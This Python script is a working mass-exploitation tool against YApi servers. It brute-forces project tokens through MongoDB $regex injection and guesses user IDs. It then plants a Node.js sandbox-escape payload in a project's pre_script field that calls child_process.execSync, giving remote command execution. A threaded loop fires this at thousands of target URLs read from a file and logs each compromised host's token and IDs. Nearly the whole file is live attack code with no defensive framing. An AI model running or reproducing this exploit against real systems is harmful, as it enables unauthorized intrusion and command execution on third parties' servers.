import requests
from concurrent.futures import ThreadPoolExecutor
import sys
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import json
import string
import logging
import utils

# url = 'https://yapi.njbandou.com'
log = logging.getLogger("yapi_cracker")
logging.basicConfig(level=logging.INFO)
#fofa: title=="YApi-高效、易用、功能强大的可视化接口管理平台"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'

class NoRegister():
    token = ''  # 未加密的token
    et = ''  # 加密后的token
    uid = -1
    pid = -1
    cid = -1
    def __init__(self, url,index):
        self.url = url
        self.index = index


    def pwn(self, token=''):
        self.detect()
        if token == '':
            self.bruce_token()
        else:
            self.token = token
        self.bruce_uid()
        self.update_project("echo '1145141919810'")
        self.bruce_cid()
        self.shell()
        self.update_project("")  # 擦屁股

    def detect(self):
        t = requests.get(self.url + '/api/interface/list', json={"token": {"$regex": "^"}}, timeout=8, verify=False).text
        if '40011' in t:
            # log.critical('Vulnerability not exist.')
            sys.exit(0)
        log.info('Vulnerability Found!')

    def bruce_token(self):
        dict = string.ascii_lowercase + string.digits
        done = ''
        log.info('Start bruce forcing token: ')
        for _ in range(20):
            for c in dict:
                guess = done + c
                payload = {
                    "token": {
                        "$regex": "^" + guess,
                    },
                    "id": -1
                }
                t = requests.post(self.url + '/api/project/up', json=payload, timeout=8, verify=False).text
                if '405' in t:
                    done = guess
                    print(c, end='')
                    break
        try:
            assert len(done) == 20
            log.info('Found token: ' + done)
            self.token = done
        except Exception as e:
            pass

    def bruce_uid(self):
        log.info('Start bruce forcing uid: ')
        for uid in range(100):
            # print('Trying uid: ' + str(uid))
            et = utils.encode_token(uid, self.token)
            text = requests.get(self.url + '/api/project/get?token=' + et).text
            if '没有权限' not in text:
                data = json.loads(text)['data']
                if uid == data['uid']:
                    print(text)
                    self.pid = data['_id']
                    self.uid = uid
                    self.et = utils.encode_token(self.uid, self.token)
                    log.info('Found uid: ' + str(self.uid))
                    print(self.index,self.url)
                    return
        # log.critical('uid not found :(')
        sys.exit(0)

    def update_project(self, cmd):
        code = '''var pwn = function () {
  Error.prepareStackTrace = (_, c) =>
    c.map((c) => c.getThis()).find((a) => a && a.process);
  const { stack } = new Error();
  console.info(stack.process.mainModule);
  return stack.process.mainModule.require('child_process').execSync("''' + cmd.replace('"', '\\"') + '''").toString();
};
requestHeader = pwn();'''
        # print('update_project')
        payload = {
            "token": self.et,
            "id": self.pid,
            "pre_script": code
        }
        t = requests.post(self.url + '/api/project/up', json=payload).text
        assert '成功' in t

    def bruce_cid(self):
        for cid in range(100):
            # print('bruce_cid')

            # print('Trying cid: ' + str(cid))
            text = requests.get(self.url+ f'/api/open/run_auto_test?token={self.token}&id={cid}').text
            if '1145141919810' in text:
                log.info('Found cid: ' + str(cid))
                self.cid = cid
                return
        # log.critical('cid not found :(')
        sys.exit(0)

    def shell(self):
        print('Type quit() to quit the shell.')
        with result_path.open('a+') as file:
                file.write(f'{self.url},{self.token},{self.cid},{self.et},{self.pid}'+line_break)

        # while True:
        #     cmd = input('> ')
        #     if cmd == 'quit()':
        #         break
        #     self.update_project(cmd)
        #     text = requests.get(self.url + f'/api/open/run_auto_test?token={self.token}&id={self.cid}').text
        #     assert 'id值不存在' not in text
        #     print(text.split('pre>')[1])
        # return

    def shell_m(self,token=None,cid=None,et=None,pid=None):
        self.token=token
        self.cid=cid
        self.et=et
        self.pid=pid
        cmd=['whoami','hostname']
        # print(self.token,self.cid,self.et)
        self.update_project(cmd[0])
        
        text = requests.get(self.url + f'/api/open/run_auto_test?token={self.token}&id={self.cid}', timeout=8, verify=False).text
        assert 'id值不存在' not in text
        # print(text)
        print(text.split('pre>')[1])
        return

def exploit(ip_, index):
    try:
        url=ip_+''
        res=requests.get(url, headers=headers, timeout=8, verify=False)
        if 'YApi' in res.text:
            Exp = NoRegister(ip_,index)
            Exp.pwn()
        else:
            return
    except Exception as e:
        pass
# def exploit(ip_, index):
#     vuln_url=ip_.split(',')
#     # print(vuln_url)
#     Exp = NoRegister(vuln_url[0],index,vuln_url[1],vuln_url[2],vuln_url[3],vuln_url[4])
#     Exp.shell()

# url=''
# exploit(url,1)


threads = []
with open(r'D:\Downloads\tmp\yapi.txt', 'r') as file:
# with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 7570
        end = start+5000      #6000+1569

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 10
# print(urls)

test = 'm'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()